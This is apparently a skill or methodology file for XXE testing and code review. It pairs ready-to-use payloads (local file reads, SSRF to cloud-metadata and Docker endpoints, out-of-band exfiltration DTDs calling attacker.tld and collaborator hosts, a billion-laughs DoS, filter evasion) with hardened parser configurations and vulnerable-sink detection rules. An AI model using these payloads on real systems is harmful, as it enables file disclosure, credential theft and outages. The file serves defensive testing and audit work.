---
name: xxe
description: XXE testing for external entity injection, file disclosure, and SSRF via XML parsers
---

# XXE

XML External Entity injection is a parser-level weakness that can expose local files, route requests to internal services (SSRF), exhaust resources via entity expansion, and in certain stacks achieve code execution through XInclude, XSLT, or language-specific protocol wrappers. Every XML consumer should be assumed vulnerable until its parser configuration is verified.

The core pattern: *user-controlled XML reaches a parser that has not disabled DTD processing or external entity resolution.*

## What XXE Is (and Is Not)

**What it IS**
- Parsers with external entity resolution enabled by default and no explicit hardening
- `SYSTEM` entities referencing `file://` or `http://` URIs
- DTD processing left on in Java DOM/SAX, PHP SimpleXML/DOMDocument, lxml-backed parsers
- Parameter entity injection: `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;`
- XInclude when XInclude processing is enabled in the pipeline
- SSRF via XXE (`http://`/`https://` entity URLs) and blind OOB exfiltration (DNS/HTTP callbacks)

**What it is NOT**
- **XSS via XML** — XML rendered as HTML without escaping
- **SSRF via non-XML** — HTTP requests from non-XML mechanisms (flag as SSRF)
- **Server-controlled XML only** — bundled configs, migration scripts, classpath resources with no user influence
- **Safe-by-default parsers** — `defusedxml` (Python), Nokogiri without entity-expansion options (Ruby), Go `encoding/xml` (no external entity resolution)
- **XMLDecoder** — Java object deserialization (CWE-502), not entity processing

## Where to Look

**Capabilities**
- File disclosure: read server files and configuration
- SSRF: reach metadata services, internal admin panels, service ports
- DoS: entity expansion (billion laughs), external resource amplification

**Injection Surfaces**
- REST/SOAP/SAML/XML-RPC, file uploads (SVG, Office)
- PDF generators, build/report pipelines, config importers

**Transclusion**
- XInclude and XSLT `document()` loading external resources

## High-Value Targets

**File Uploads**
- SVG/MathML, Office (docx/xlsx/ods/odt), XML-based archives
- Android/iOS plist, project config imports

**Protocols**
- SOAP/XML-RPC/WebDAV/SAML (ACS endpoints)
- RSS/Atom feeds, server-side renderers and converters

**Hidden Paths**
- Parameters: "xml", "upload", "import", "transform", "xslt", "xsl", "xinclude"
- Processing-instruction headers

## How to Detect

### Direct

- Inline disclosure of entity content in the HTTP response, transformed output, or error pages

### Error-Based

- Coerce parser errors that leak path fragments or file content via interpolated messages

### OAST

- Blind XXE via parameter entities and external DTDs; confirm with DNS/HTTP callbacks
- Encode data into request paths/parameters to exfiltrate small secrets (hostnames, tokens)

### Timing

- Fetch slow or unroutable resources to produce measurable latency differences (connect vs read timeouts)

## Core Payloads

### Local File

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r>&xxe;</r>
```

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<r>&xxe;</r>
```

### SSRF

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://127.0.0.1:2375/version">]>
<r>&xxe;</r>
```

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI">]>
<r>&xxe;</r>
```

### OOB Parameter Entity

```xml
<!DOCTYPE x [<!ENTITY % dtd SYSTEM "http://attacker.tld/evil.dtd"> %dtd;]>
```

evil.dtd:
```xml
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % e "<!ENTITY &#x25; exfil SYSTEM 'http://%f;.attacker.tld/'>">
%e; %exfil;
```

## Vulnerability Patterns

### Parameter Entities

- Use parameter entities in the DTD subset to define secondary entities that exfiltrate content
- Works even when general entities are sanitized in the XML tree

### XInclude

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

Effective where entity resolution is blocked but XInclude remains enabled in the pipeline.

### XSLT Document

XSLT processors can fetch external resources via `document()`:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

Targets: transform endpoints, reporting engines (XSLT/Jasper/FOP), xml-stylesheet PI consumers.

### Protocol Wrappers

- Java: `jar:`, `netdoc:`
- PHP: `php://filter`, `expect://` (when module enabled)
- Gopher: craft raw requests to Redis/FCGI when client allows non-HTTP schemes

## Evasion Patterns

**Encoding Variants**
- UTF-16/UTF-7 declarations, mixed newlines
- CDATA and comments to evade naive filters

**DOCTYPE Variants**
- PUBLIC vs SYSTEM, mixed case `<!DoCtYpE>`
- Internal vs external subsets, multi-DOCTYPE edge handling

**Network Controls**
- If network blocked but filesystem readable, pivot to local file disclosure
- If files blocked but network open, pivot to SSRF/OAST

## Special Contexts

### SOAP

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE d [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <d>&xxe;</d>
  </soap:Body>
</soap:Envelope>
```

### SAML

- Assertions are XML-signed, but upstream XML parsers prior to signature verification may still process entities/XInclude
- Test ACS endpoints with minimal probes

### SVG and Renderers

- Inline SVG and server-side SVG→PNG/PDF renderers process XML
- Attempt local file reads via entities/XInclude

### Office Docs

- OOXML (docx/xlsx/pptx) are ZIPs containing XML
- Insert payloads into document.xml, rels, or drawing XML and repackage

## Analysis Workflow

1. **Inventory consumers** - Endpoints, upload parsers, background jobs, CLI tools, converters, third-party SDKs
2. **Capability probes** - Does parser accept DOCTYPE? Resolve external entities? Allow network access? Support XInclude/XSLT?
3. **Establish oracle** - Error shape, length/ETag diffs, OAST callbacks
4. **Escalate** - Targeted file/SSRF payloads
5. **Validate parity** - Same parser options must hold across REST, SOAP, SAML, file uploads, and background jobs

## Confirming a Finding

1. Provide a minimal payload proving parser capability (DOCTYPE/XInclude/XSLT)
2. Demonstrate controlled access (file path or internal URL) with reproducible evidence
3. Confirm blind channels with OAST and correlate to the triggering request
4. Show cross-channel consistency (e.g., same behavior in upload and SOAP paths)
5. Bound impact: exact files/data reached or internal targets proven

### Dynamic Test / PoC

Minimal reflected-XXE probe — send to any endpoint accepting `application/xml` or `text/xml`:

```bash
curl -X POST 'https://app.example.com/api/import' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

**Expected signal (reflected)**: `/etc/passwd` content (e.g., `root:`) in response body, transformed output, or error page.

**Blind OOB (parameter entity + external DTD)**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR.oast.fun/xxe.dtd"> %xxe;]>
<root>test</root>
```

Host `xxe.dtd` (HTTP) and confirm callback:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-COLLABORATOR.oast.fun/?d=%file;'>">
%eval;
%exfil;
```

**Parameter entity inline (no external DTD file)**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % a "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"> %a;]>
<root>&xxe;</root>
```

**Content-Type switch (JSON endpoint → XML)**
```bash
curl -X POST 'https://app.example.com/api/data' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

**SVG upload**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

**DoS-only (billion laughs)** — use only when DoS impact is in scope; expect timeout/500:
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>
```

## Common False Alarms

- DOCTYPE accepted but entities not resolved and no transclusion reachable
- Filters or sandboxes that emit entity strings literally (no IO performed)
- Mocks/stubs that simulate success without network/file access
- XML processed only client-side (no server parse)

## Business Risk

- Disclosure of credentials/keys/configs, code, and environment secrets
- Access to cloud metadata/token services and internal admin panels
- Denial of service via entity expansion or slow external resources
- Code execution via XSLT/expect:// in insecure stacks

## Analyst Notes

1. Prefer OAST first; it is the quietest confirmation in production-like paths
2. When content is sanitized, use error-based and length/ETag diffs
3. Probe XInclude/XSLT; they often remain enabled after entity resolution is disabled
4. Aim SSRF at internal well-known ports (kubelet, Docker, Redis, metadata) before public hosts
5. In uploads, repackage OOXML/SVG rather than standalone XML; many apps parse these implicitly
6. Keep payloads minimal; avoid noisy billion-laughs unless specifically testing DoS
7. Test background processors separately; they often use different parser settings
8. Validate parser options in code/config; do not rely on WAFs to block DOCTYPE
9. Combine with path traversal and deserialization where XML touches downstream systems
10. Document exact parser behavior per stack; defenses must match real libraries and flags

## Core Principle

XXE is eliminated by hardening parsers: forbid DOCTYPE, disable external entity resolution, and disable network access for XML processors and transformers across every code path.

## Parser Recon Indicators

Flag any XML parse/transform call lacking adjacent hardening (DTD/external-entity disable). Grep for these sinks:

| Language | Vulnerable sinks (flag unless hardened) |
|----------|----------------------------------------|
| **Python** | `ET.parse`, `ET.fromstring`, `ET.iterparse`, `minidom.parseString`, `xml.sax.parse`, `xmltodict.parse`; `etree.parse/fromstring/XML`, `objectify.parse` without `resolve_entities=False` |
| **Java** | `DocumentBuilderFactory` → `parse`, `SAXParserFactory` → `parse`, `XMLInputFactory` → `createXMLStreamReader`, `TransformerFactory` → `newTransformer`, `SchemaFactory` → `newSchema`, JAXB `Unmarshaller` |
| **PHP** | `simplexml_load_string/file`, `DOMDocument::loadXML/load`, `xml_parse`, `SimpleXMLElement` constructor |
| **.NET** | `XmlDocument.Load/LoadXml`, `XmlTextReader`, `XDocument.Load`, `XmlReader.Create` without `DtdProcessing.Prohibit` |
| **Node.js** | `libxmljs.parseXmlString/parseXml`, `node-expat`, `sax.parser` (check entity expansion) |
| **Ruby** | `Nokogiri::XML` with `config.noent`, `REXML::Document.new`, `LibXML::XML::Document.string` |
| **Go** | Third-party parsers (e.g., `beevik/etree`); stdlib `encoding/xml` does not resolve external entities |

**Skip (safe patterns)**: `import defusedxml`; `XMLParser(resolve_entities=False, no_network=True)`; Java `disallow-doctype-decl=true`; .NET `DtdProcessing.Prohibit` + `XmlResolver = null`; Nokogiri without `noent`; `xml2js.parseString` v0.5+.

## Safe Parser Configuration

Patterns indicating the parser is likely **not** vulnerable:

```java
// Java DOM — disable DTD and external entities
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

```python
# Python — defusedxml drop-in (always safe)
import defusedxml.ElementTree as ET
tree = ET.parse(source)
```

```php
// PHP 7.x — disable entity loader; LIBXML_NONET blocks network (LIBXML_NOENT alone EXPANDS entities)
libxml_disable_entity_loader(true);
$doc->loadXML($xml, LIBXML_NONET);
```

```csharp
// .NET — prohibit DTD, null resolver
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

```javascript
// Node.js — xml2js does not resolve external entities by default (v0.5+)
xml2js.parseString(xmlInput, callback);
```

## Python/JS/PHP Source Detection Rules

### Python
- **VULN (lxml)**: `lxml.etree.parse(user_xml)` — lxml allows external entities by default
- **VULN (lxml)**: `lxml.etree.fromstring(user_xml)` — same default behavior
- **VULN (stdlib)**: `xml.etree.ElementTree.fromstring(user_xml)` — expat may resolve entities (CPython < 3.8 quirks)
- **SAFE (lxml)**:
  ```python
  parser = lxml.etree.XMLParser(resolve_entities=False, no_network=True)
  lxml.etree.parse(source, parser)
  ```
- **SAFE (stdlib)**: `defusedxml.ElementTree.parse(user_xml)` — use defusedxml library

```python
# VULNERABLE: lxml resolves external entities by default
from lxml import etree
tree = etree.fromstring(request.body)

# SECURE: disable entity resolution and network
parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
tree = etree.fromstring(request.body, parser)
```

### PHP
- **VULN**: `simplexml_load_string($userXml)` — no entity protection
- **VULN**: `$doc = new DOMDocument(); $doc->loadXML($userXml)` — external entities enabled by default
- **VULN**: `libxml_disable_entity_loader(false)` or absent call before SimpleXML/DOMDocument usage (PHP < 8.0)
- **VULN**: `loadXML($xml, LIBXML_NOENT)` — NOENT **expands** entities; does not disable loading
- **SAFE**: `libxml_disable_entity_loader(true)` called before parsing (PHP < 8.0)
- **SAFE**: PHP 8.0+ disables external entity loading by default; still prefer `LIBXML_NONET` for network blocking

## Java XML Parser Detection Rules

### DocumentBuilderFactory — Vulnerable vs Safe Configuration

```java
// VULNERABLE: default DocumentBuilderFactory (external entities enabled)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(request.getInputStream());
// No protective features set — DOCTYPE and external entities fully enabled

// VULNERABLE: explicit external entity access enabled
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://xml.org/sax/features/external-general-entities", true);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", true);

// SAFE: all protective features set
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

**VULN indicator**: `DocumentBuilderFactory.newInstance()` without any call to `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` parsing user-supplied XML.

### SAXParserFactory — Vulnerable vs Safe

```java
// VULNERABLE: default SAX parser
SAXParserFactory spf = SAXParserFactory.newInstance();
SAXParser sp = spf.newSAXParser();
sp.parse(request.getInputStream(), handler);

// SAFE:
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
```

### XMLInputFactory (StAX) — Vulnerable vs Safe

```java
// VULNERABLE: default StAX factory
XMLInputFactory xif = XMLInputFactory.newInstance();
XMLStreamReader xsr = xif.createXMLStreamReader(request.getInputStream());

// SAFE:
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
```

### XMLDecoder — Critical: This is Deserialization, NOT XXE

```java
// CRITICAL — NOT XXE, but arbitrary Java method invocation:
// XMLDecoder is a Java object deserialization mechanism, not an XML entity processor.
// Tag as insecure_deserialization, NOT xxe.
XMLDecoder decoder = new XMLDecoder(request.getInputStream());
Object obj = decoder.readObject();   // Tag: insecure_deserialization
```

**Important**: Do NOT tag `XMLDecoder` as XXE. It is a deserialization sink (CWE-502), not an XML entity processor.

### TransformerFactory (XSLT) — Vulnerable vs Safe

```java
// VULNERABLE: XSLT transformation of user-supplied stylesheet
TransformerFactory tf = TransformerFactory.newInstance();
Source xslt = new StreamSource(request.getInputStream());  // user-controlled XSLT
Transformer t = tf.newTransformer(xslt);  // XSLT document() can read files/SSRF

// SAFE: secure processing enabled
TransformerFactory tf = TransformerFactory.newInstance();
tf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
```

### Java TRUE POSITIVE Rules

- `DocumentBuilderFactory.newInstance()` parsing user-controlled XML with NO `disallow-doctype-decl` feature → **CONFIRM**
- `SAXParserFactory.newInstance()` parsing user input with no external-entity features set → **CONFIRM**
- `XMLInputFactory.newInstance()` with `IS_SUPPORTING_EXTERNAL_ENTITIES` not set to false → **CONFIRM**
- `TransformerFactory.newInstance()` processing user-supplied XSLT without `FEATURE_SECURE_PROCESSING` → **CONFIRM**
- `Validator.validate()` / `SchemaFactory` on user-controlled XML schema → **CONFIRM** (schema can include external entities)
- Controller/module explicitly named `xxe` or handling XML input with SAXParser/DocumentBuilder/Unmarshaller on user-controlled data without entity-disabling features → **CONFIRM**

### Java FALSE POSITIVE Rules

- `DocumentBuilderFactory` with `disallow-doctype-decl=true` → **SAFE** (DTD and entities blocked)
- `XMLConstants.FEATURE_SECURE_PROCESSING = true` set on factory → mitigates most XXE vectors
- XML parsed from server-controlled resources only (classpath, config files) — no user input reaches parser
- `XMLDecoder` — tag as `insecure_deserialization`, not `xxe`
- Do not emit `xxe` for plain XML rendering pages that have no XML parsing path or module intent

### .NET — XmlDocument / XmlReader

```csharp
// VULNERABLE: default XmlDocument resolves external entities
XmlDocument doc = new XmlDocument();
doc.Load(stream);

// SECURE: null resolver + XmlReader with DtdProcessing.Prohibit
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null;
doc.Load(stream);

XmlReaderSettings settings = new XmlReaderSettings {
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null
};
XmlReader reader = XmlReader.Create(stream, settings);
```

### Node.js — libxmljs

```javascript
// VULNERABLE: libxmljs resolves entities by default
const doc = libxml.parseXmlString(req.body);

// SECURE: prefer xml2js or a non-libxml2-backed parser for untrusted input
```

### Ruby — Nokogiri

```ruby
# VULNERABLE: noent enables entity substitution
Nokogiri::XML(xml_input) { |config| config.noent }

# SECURE: default Nokogiri (no options) — safe for untrusted input
Nokogiri::XML(xml_input)
```

### Go — third-party parsers

```go
// VULNERABLE: check third-party library entity/network behavior
doc := etree.NewDocument()
doc.ReadFromBytes(userData)

// SECURE: stdlib encoding/xml does not resolve external entities
xml.Unmarshal(userData, &v)
```

## XXE (external entity / file read / SSRF)

Commonly affected languages: Java, Python, PHP, JavaScript, Ruby, C#. Go stdlib `encoding/xml` is generally safe; flag third-party XML libraries with entity support.

**Parsers / sinks**:
- **Java**: `DocumentBuilder.parse`, `SAXParser.parse`, `XMLStreamReader`, JDOM/SAXBuilder, dom4j `SAXReader`, `XMLReader`, `SAXSource`, `TransformerFactory`, `SchemaFactory`, JAXB `Unmarshaller`, `XPathExpression` — when factory lacks safe features
- **Python**: `lxml`, stdlib XML parsers vulnerable to external entities
- **JavaScript**: parsers that resolve external entities or parameter+internal entities
- **Ruby**: Nokogiri/libxml backends vulnerable to external entities

**Java safe configuration** (parser not flagged when present):
- `DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`, or both external general/parameter entities disabled.
- StAX: `IS_SUPPORTING_EXTERNAL_ENTITIES=false`, `SUPPORT_DTD=false`.
- `TransformerFactory`: secure processing feature, empty `ACCESS_EXTERNAL_STYLESHEET` / `ACCESS_EXTERNAL_DTD`.
- Pre-built safe SAX source flowing to parse call.

**Sanitizers**: Python/JS XML escaping output nodes (limited — prefer parser hardening).

## XML Bomb / entity expansion (CWE-776)

- **Python**: `xml.etree` default expansion — use `defusedxml`
- **JavaScript**: unbounded internal entity expansion

## XSLT injection (CWE-074 / XXE-adjacent)

- **Java**: user XSLT → `TransformerFactory.newTransformer`, Saxon `XsltCompiler.compile`, `Templates.newTransformer` without secure processing
- **Python**: lxml/libxslt transform with user stylesheet

## Missing schema validation (CWE-112)

- **C#**: `XmlReader.Create` without `ValidationType.Schema`, or with `ProcessInlineSchema` / `ProcessSchemaLocation`

## Source → Sink Pattern

Remote input → XML/XSLT bytes or stream → parse/transform call on **insecurely configured** factory (Java: parser lacks safe feature configuration).

## Common False Alarms

- Java factory with `disallow-doctype-decl` or paired external-entity disables — safe.
- `XMLDecoder.readObject` — tag `insecure_deserialization`, not `xxe`.
- Python `lxml` with `XMLParser(resolve_entities=False, no_network=True)` — not XXE sink.
- PHP 8.0+ default external-entity off — verify parser API still used.
- C# missing schema validation is recommendation severity — DTD validation against user DTD is still weak.

## Business Risk

Confirmed XXE/XSLT paths imply file read, SSRF, OOB exfil, DoS (billion laughs / xml-bomb), and XSLT `document()` RCE on weak JDK transforms.

## Core Principle

Treat XML consumers as vulnerable until parser/transformer hardening is proven in the same flow; mirror those settings across every parse path including uploads, SOAP, SAML, and background jobs.
